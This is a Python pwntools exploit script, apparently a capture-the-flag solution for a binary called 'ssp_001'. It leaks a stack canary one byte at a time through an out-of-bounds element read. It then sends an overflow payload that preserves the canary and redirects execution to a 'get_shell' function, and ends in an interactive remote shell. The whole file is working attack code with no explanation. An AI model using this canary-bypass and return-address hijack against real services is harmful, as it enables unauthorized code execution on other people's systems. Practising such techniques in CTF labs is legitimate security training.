#! /usr/bin/env python3

import pwn
import sys

# pwn.context.log_level = "debug"


r = pwn.remote(sys.argv[1], int(sys.argv[2]))

e = pwn.ELF("src/ssp_001")


r.sendlineafter(b">", b"F")
r.sendlineafter(b"box input : ", b"")

canary = b""

for cnt in range(0x80, 0x80 + 0x04):
    r.sendlineafter(b"> ", b"P")
    r.sendlineafter(b"Element index : ", bytes(str(cnt), "ascii"))
    r.recvuntil(b"is : ")
    data = r.recvn(2)
    canary = data + canary

pwn.success(str(canary, "ascii"))

payload = b"A" * 0x40
payload += pwn.p32(int(canary, 16))
payload += b"B" * 0x8
payload += pwn.p32(e.symbols["get_shell"])

r.sendline(b"E")
r.sendlineafter(b"Name Size : ", str(len(payload)))
r.sendlineafter(b"Name : ", payload)

r.interactive()